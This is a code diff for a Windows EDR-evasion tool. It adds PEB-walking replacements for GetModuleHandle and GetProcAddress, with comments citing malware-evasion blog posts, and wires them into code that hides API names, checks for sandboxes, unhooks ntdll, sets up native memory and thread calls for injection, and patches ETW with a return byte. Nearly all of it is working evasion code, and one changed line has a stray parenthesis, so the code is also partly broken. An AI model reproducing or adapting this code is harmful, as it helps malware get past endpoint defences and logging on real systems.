@@ -13,7 +13,11 @@
 #include <stdlib.h>
 #include <string.h>
 #include <memoryapi.h>
+#include <shlwapi.h>
 #include <stdio.h>
+#include <string.h>
+
+#pragma comment(lib, "Shlwapi.lib")
 
 #define BOLD "\033[1m"
 #define GREEN "\033[0;32m"
@@ -26,6 +30,85 @@
 #define PRINT_STATUS(fmt, ...) printf(BLUE " [*] " NC BOLD fmt NL NC, __VA_ARGS__)
 #define PRINT_ERROR(fmt, ...) printf("\t" RED " [!] " NC BOLD fmt NL NC, __VA_ARGS__)
 #define BR(fmt, ...) printf("\t" RED " [-] Author => Hossam Ehab / An EDR (End Point Detection & Response) Evasion Tool " NC BOLD fmt NL NC, __VA_ARGS__)
+
+int cmpUnicodeStr(WCHAR substr[], WCHAR mystr[]) {
+  _wcslwr_s(substr, MAX_PATH);
+  _wcslwr_s(mystr, MAX_PATH);
+
+  int result = 0;
+  if (StrStrW(mystr, substr) != NULL) {
+    result = 1;
+  }
+
+  return result;
+}
+
+// https://cocomelonc.github.io/malware/2023/04/16/malware-av-evasion-16.html
+FARPROC myGetProcAddr(HMODULE hModule, LPCSTR lpProcName) {
+  PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
+  PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
+  PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + 
+  ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+  DWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfFunctions);
+  WORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule + exportDirectory->AddressOfNameOrdinals);
+  DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfNames);
+
+  for (DWORD i = 0; i < exportDirectory->NumberOfNames; ++i) {
+    if (strcmp(lpProcName, (const char*)hModule + addressOfNames[i]) == 0) {
+      return (FARPROC)((BYTE*)hModule + addressOfFunctions[addressOfNameOrdinals[i]]);
+    }
+  }
+
+  return NULL;
+}
+
+// https://cocomelonc.github.io/malware/2023/04/08/malware-av-evasion-15.html
+// custom implementation
+HMODULE myGetModuleHandle(LPCWSTR lModuleName) {
+
+  // obtaining the offset of PPEB from the beginning of TEB
+//   PEB* pPeb = (PEB*)__readgsqword(0x60);
+#ifdef _M_IX86 
+  PEB * pPeb = (PEB *) __readfsdword(0x30);
+#else
+  PEB * pPeb = (PEB *)__readgsqword(0x60);
+#endif
+
+  // for x86
+  // PEB* pPeb = (PEB*)__readgsqword(0x30);
+
+  // obtaining the address of the head node in a linked list 
+  // which represents all the models that are loaded into the process.
+  PEB_LDR_DATA* Ldr = pPeb->Ldr;
+  LIST_ENTRY* ModuleList = &Ldr->InMemoryOrderModuleList; 
+
+  // iterating to the next node. this will be our starting point.
+  LIST_ENTRY* pStartListEntry = ModuleList->Flink;
+
+  // iterating through the linked list.
+  WCHAR mystr[MAX_PATH] = { 0 };
+  WCHAR substr[MAX_PATH] = { 0 };
+  for (LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != ModuleList; pListEntry = pListEntry->Flink) {
+
+    // getting the address of current LDR_DATA_TABLE_ENTRY (which represents the DLL).
+    LDR_DATA_TABLE_ENTRY* pEntry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY));
+
+    // checking if this is the DLL we are looking for
+    memset(mystr, 0, MAX_PATH * sizeof(WCHAR));
+    memset(substr, 0, MAX_PATH * sizeof(WCHAR));
+    wcscpy_s(mystr, MAX_PATH, pEntry->FullDllName.Buffer);
+    wcscpy_s(substr, MAX_PATH, lModuleName);
+    if (cmpUnicodeStr(substr, mystr)) {
+      // returning the DLL base address.
+      return (HMODULE)pEntry->DllBase;
+    }
+  }
+
+  // the needed DLL wasn't found
+  PRINT_ERROR("failed to get a handle to %s\n", lModuleName);
+  return NULL;
+}
 
 VOID EnableConsoleColors()
 {
@@ -174,7 +257,7 @@ BOOL checkNUMA() {
 	LPVOID mem = NULL;
 	char cVirtualAllocExNuma[] = { 0xe0, 0xdf, 0xc4, 0xc2, 0xc3, 0xd7, 0xda, 0xf7, 0xda, 0xda, 0xd9, 0xd5, 0xf3, 0xce, 0xf8, 0xc3, 0xdb, 0xd7, 0x0 };
 	deObfuscate(cVirtualAllocExNuma, SIZEOF(cVirtualAllocExNuma));
-	pVirtualAllocExNuma myVirtualAllocExNuma = (pVirtualAllocExNuma)GetProcAddress(GetModuleHandle("kernel32.dll"), cVirtualAllocExNuma);
+	pVirtualAllocExNuma myVirtualAllocExNuma = (pVirtualAllocExNuma)myGetProcAddr(GetModuleHandle("kernel32.dll"), cVirtualAllocExNuma);
 	mem = myVirtualAllocExNuma(pGetCurrentProcessFunc(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);
 	if (mem != NULL) {
 		return false;
@@ -246,7 +329,11 @@ int main(int argc, char** argv) {
 	deObfuscate(cAmsi, SIZEOF(cAmsi)); // decrypt "amsi.dll"
 
 	hAMSI = LoadLibraryA(cAmsi);
-	HMODULE hModuleK = GetModuleHandle(TEXT(cLib2Name));
+
+	wchar_t wtk[20];
+  	mbstowcs(wtk, cLib2Name, strlen(cLib2Name)+1); //plus null
+  	LPWSTR wcLib2dll = wtk;
+	HMODULE hModuleK = myGetModuleHandle(wcLib2dll));
 	
 	free(pMem);
 
@@ -277,23 +364,28 @@ int main(int argc, char** argv) {
 
 	PRINT_STATUS("Copy ntdll to a fresh memory allocation and overwrite calls adresses, Detecting ntdll hooking : \n");
 	int nbHooks = 0;
-	if (isItHooked(GetProcAddress(GetModuleHandleA(cNtdll), cNtAllocateVirtualMemory))) { PRINT_ERROR(" NtAllocateVirtualMemory is Hooked\n"); nbHooks++; } else { PRINT_SUCCESS(" NtAllocateVirtualMemory Not Hooked"); }
-	if (isItHooked(GetProcAddress(GetModuleHandleA(cNtdll), cNtProtectVirtualMemory))) {  PRINT_ERROR(" NtProtectVirtualMemory is Hooked\n");  nbHooks++; } else { PRINT_SUCCESS(" NtProtectVirtualMemory Not Hooked"); }
-	if (isItHooked(GetProcAddress(GetModuleHandleA(cNtdll), cNtCreateThreadEx))) {PRINT_ERROR(" NtCreateThreadEx is Hooked\n"); nbHooks++;                } else { PRINT_SUCCESS(" NtCreateThreadEx Not Hooked"); }
-	if (isItHooked(GetProcAddress(GetModuleHandleA(cNtdll), cNtQueryInformationThread))) {PRINT_ERROR(" NtQueryInformationThread Hooked\n"); nbHooks++;   } else { PRINT_SUCCESS(" NtQueryInformationThread Not Hooked\n"); }
+
+	wchar_t wtext[20];
+  	mbstowcs(wtext, cNtdll, strlen(cNtdll)+1); //plus null
+  	LPWSTR wNtdll = wtext;
+
+	if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtAllocateVirtualMemory))) { PRINT_ERROR(" NtAllocateVirtualMemory is Hooked\n"); nbHooks++; } else { PRINT_SUCCESS(" NtAllocateVirtualMemory Not Hooked"); }
+	if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtProtectVirtualMemory))) {  PRINT_ERROR(" NtProtectVirtualMemory is Hooked\n");  nbHooks++; } else { PRINT_SUCCESS(" NtProtectVirtualMemory Not Hooked"); }
+	if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtCreateThreadEx))) {PRINT_ERROR(" NtCreateThreadEx is Hooked\n"); nbHooks++;                } else { PRINT_SUCCESS(" NtCreateThreadEx Not Hooked"); }
+	if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtQueryInformationThread))) {PRINT_ERROR(" NtQueryInformationThread Hooked\n"); nbHooks++;   } else { PRINT_SUCCESS(" NtQueryInformationThread Not Hooked\n"); }
 
 	deObfuscateFunc();
 
 	/* Load system functions */
 
 	if (hModuleK != NULL) {
-		pVirtualProtectFunc = (VirtualProtectFunc)GetProcAddress(hModuleK, b);
-		pCreateFileAFunc = (CreateFileAFunc)GetProcAddress(hModuleK, cCreateFileA);
-		pGetCurrentProcessFunc = (GetCurrentProcessFunc)GetProcAddress(hModuleK, cGetCurrentProcess);
-		pCheckRemoteDebuggerPresentFunc = (CheckRemoteDebuggerPresentFunc)GetProcAddress(hModuleK, cCheckRemote);
-		pGlobalMemoryStatusExFunc = (GlobalMemoryStatusExFunc)GetProcAddress(hModuleK, cCheckGlobalMemory);
-		pMapViewOfFileFunc = (MapViewOfFileFunc)GetProcAddress(hModuleK, cMapViewOfFile);
-		pCreateFileMappingAFunc = (CreateFileMappingAFunc)GetProcAddress(hModuleK, cCreateFileMapping);
+		pVirtualProtectFunc = (VirtualProtectFunc)myGetProcAddr(hModuleK, b);
+		pCreateFileAFunc = (CreateFileAFunc)myGetProcAddr(hModuleK, cCreateFileA);
+		pGetCurrentProcessFunc = (GetCurrentProcessFunc)myGetProcAddr(hModuleK, cGetCurrentProcess);
+		pCheckRemoteDebuggerPresentFunc = (CheckRemoteDebuggerPresentFunc)myGetProcAddr(hModuleK, cCheckRemote);
+		pGlobalMemoryStatusExFunc = (GlobalMemoryStatusExFunc)myGetProcAddr(hModuleK, cCheckGlobalMemory);
+		pMapViewOfFileFunc = (MapViewOfFileFunc)myGetProcAddr(hModuleK, cMapViewOfFile);
+		pCreateFileMappingAFunc = (CreateFileMappingAFunc)myGetProcAddr(hModuleK, cCreateFileMapping);
 	}
 
 /*	
@@ -325,7 +417,7 @@ int main(int argc, char** argv) {
 		char sntdll[] = { '.','t','e','x','t',0 };
 		HANDLE process = pGetCurrentProcessFunc();
 		MODULEINFO mi = {};
-		HMODULE ntdllModule = GetModuleHandleA(cNtdll);
+		HMODULE ntdllModule = myGetModuleHandle(wNtdll);
 		GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
 		LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
 
@@ -346,18 +438,18 @@ int main(int argc, char** argv) {
 
 		printf("\n[+] Detecting hooks in new ntdll module\n");
 
-		if (isItHooked(GetProcAddress(GetModuleHandleA(cNtdll), cNtAllocateVirtualMemory))) { PRINT_ERROR(" NtAllocateVirtualMemory Hooked\n"); }   else { PRINT_SUCCESS(" NtAllocateVirtualMemory Not Hooked\n"); }
-		if (isItHooked(GetProcAddress(GetModuleHandleA(cNtdll), cNtProtectVirtualMemory))) { PRINT_ERROR(" NtProtectVirtualMemory Hooked\n");}      else { PRINT_SUCCESS(" NtProtectVirtualMemory Not Hooked\n"); }
-		if (isItHooked(GetProcAddress(GetModuleHandleA(cNtdll), cNtCreateThreadEx))) { PRINT_ERROR(" NtCreateThreadEx is Hooked\n"); nbHooks++; }   else { PRINT_SUCCESS(" NtCreateThreadEx Not Hooked\n"); }
-		if (isItHooked(GetProcAddress(GetModuleHandleA(cNtdll), cNtQueryInformationThread))) { PRINT_ERROR(" NtQueryInformationThread Hooked\n"); } else {	PRINT_SUCCESS("NtQueryInformationThread Not Hooked\n"); }
+		if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtAllocateVirtualMemory))) { PRINT_ERROR(" NtAllocateVirtualMemory Hooked\n"); }   else { PRINT_SUCCESS(" NtAllocateVirtualMemory Not Hooked\n"); }
+		if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtProtectVirtualMemory))) { PRINT_ERROR(" NtProtectVirtualMemory Hooked\n");}      else { PRINT_SUCCESS(" NtProtectVirtualMemory Not Hooked\n"); }
+		if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtCreateThreadEx))) { PRINT_ERROR(" NtCreateThreadEx is Hooked\n"); nbHooks++; }   else { PRINT_SUCCESS(" NtCreateThreadEx Not Hooked\n"); }
+		if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtQueryInformationThread))) { PRINT_ERROR(" NtQueryInformationThread Hooked\n"); } else {	PRINT_SUCCESS("NtQueryInformationThread Not Hooked\n"); }
 	} else { PRINT_STATUS("No hooked modules to unhook it!"); }
 
-	HINSTANCE hNtdll = GetModuleHandleA(cNtdll);
-	uNtAllocateVirtualMemory NtAllocateVirtualMemory = (uNtAllocateVirtualMemory)GetProcAddress(hNtdll, cNtAllocateVirtualMemory);
-	uNtWriteVirtualMemory NtWriteVirtualMemory = (uNtWriteVirtualMemory)GetProcAddress(hNtdll, cNtWriteVirtualMemory);
-	uNtProtectVirtualMemory NtProtectVirtualMemory = (uNtProtectVirtualMemory)GetProcAddress(hNtdll, cNtProtectVirtualMemory);
-	uNtCreateThreadEx NtCreateThreadEx = (uNtCreateThreadEx)GetProcAddress(hNtdll, cNtCreateThreadEx);
-	uNtQueryInformationThread NtQueryInformationThread = (uNtQueryInformationThread)GetProcAddress(hNtdll, cNtQueryInformationThread);
+	HINSTANCE hNtdll = myGetModuleHandle(wNtdll);
+	uNtAllocateVirtualMemory NtAllocateVirtualMemory = (uNtAllocateVirtualMemory)myGetProcAddr(hNtdll, cNtAllocateVirtualMemory);
+	uNtWriteVirtualMemory NtWriteVirtualMemory = (uNtWriteVirtualMemory)myGetProcAddr(hNtdll, cNtWriteVirtualMemory);
+	uNtProtectVirtualMemory NtProtectVirtualMemory = (uNtProtectVirtualMemory)myGetProcAddr(hNtdll, cNtProtectVirtualMemory);
+	uNtCreateThreadEx NtCreateThreadEx = (uNtCreateThreadEx)myGetProcAddr(hNtdll, cNtCreateThreadEx);
+	uNtQueryInformationThread NtQueryInformationThread = (uNtQueryInformationThread)myGetProcAddr(hNtdll, cNtQueryInformationThread);
 
 	/* 
 		PATCH ETW : is technique used for bypassing some security controls, If you want to read about it see this from ired.team :
@@ -367,7 +459,7 @@ int main(int argc, char** argv) {
 	PRINT_SUCCESST("Patching ETW 'Event Tracing for Windows' writer");
 	deObfuscate(cEtwEventWrite, SIZEOF(cEtwEventWrite));
 
-	void* etwAddr = GetProcAddress(GetModuleHandleA(cNtdll), cEtwEventWrite);
+	void* etwAddr = myGetProcAddr(myGetModuleHandle(wNtdll), cEtwEventWrite);
 	char etwPatch[] = { 0xC3 };
 	DWORD lpflOldProtect = 0;
 	unsigned __int64 memPage = 0x1000;
